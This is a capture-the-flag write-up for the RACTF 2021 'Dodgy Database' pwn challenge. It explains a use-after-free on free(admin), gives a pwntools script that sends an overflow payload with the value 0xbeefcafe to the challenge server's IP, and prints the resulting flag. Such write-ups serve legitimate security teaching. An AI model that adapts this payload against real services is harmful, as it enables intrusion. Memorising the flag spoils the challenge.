---
title: "Ractf 2021 - Dodgy Database"
draft: false
tags: ['ractf', 'pwn']
---

The challenge was a part of the [Really Awesome CTF 2021](https://2021.ractf.co.uk/) and it can be viewed on [ctftime.org](https://ctftime.org/task/16986). 

Basically we are provided with a executable and its source code. Upon reading the source code we see that there is a 'GOD' role and if we are able to acquire that GOD role, the program prints the flag. The only way to input data is from stdin, where the challenge prompts for a new user to be created. 

The vulnerable piece of code is a free(admin) statement. 

{{< highlight c >}}
	// check registered
	if (!users_check_registered(users, admin, username)) {
		// register the user
		free(admin);
		User* user = user_create(username);
		users_register_user(users, admin, user);
	}
{{< / highlight >}}

To exploit this vulnerability, we need to be able to pass a specific hexadecimal value as input, which overflows the name field of the user struct. We initally spent a lot of time trying to achieve this manually. 

Finally resorted to using python and pwntools. Here is the exploit code

{{< highlight python >}}
#!/usr/bin/env python3
from pwn import *
LOCAL = False
if(LOCAL):
    elf  = ELF('./chall')
    s = elf.process()
else:
    s = remote('193.57.159.27', 44340)
prompt = s.recv()
send_data = b'aaaaaaaaaaaaaaaaaaaa' + p32(0xbeefcafe)
s.sendline(send_data)
print(s.recv())
s.close()
{{< / highlight >}}

which yields the flag

> Flag : ractf{w0w_1_w0nD3r_wH4t_free(admin)_d0e5}